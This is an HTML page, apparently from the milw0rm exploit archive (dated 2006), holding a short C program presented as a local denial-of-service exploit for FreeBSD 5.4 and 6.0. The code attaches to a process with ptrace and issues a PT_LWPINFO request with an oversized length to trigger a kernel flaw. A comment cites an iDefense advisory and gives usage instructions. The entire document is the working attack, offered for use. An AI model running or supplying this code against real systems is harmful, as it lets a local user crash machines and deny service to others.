<html><head><title>FreeBSD 5.4 / 6.0 (ptrace PT_LWPINFO) Local Denial of Service Exploit</title></head><pre>#include &lt;sys/types.h&gt;
#include &lt;sys/ptrace.h&gt;
#include &lt;unistd.h&gt;
/* lol lol, exploit for http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=419
thank you oh unknown, sincerely kokanin@gmail. usage: ./blah &lt;pid you own&gt; */

int main(int argc, char *argv[]){
	struct ptrace_lwpinfo *lol;
	ptrace(PT_ATTACH,atoi(argv[1]),NULL,0);
	wait(NULL);
	ptrace(PT_LWPINFO,atoi(argv[1]),(void *)&amp;lol,32768);
}

// milw0rm.com [2006-10-12]</pre></html>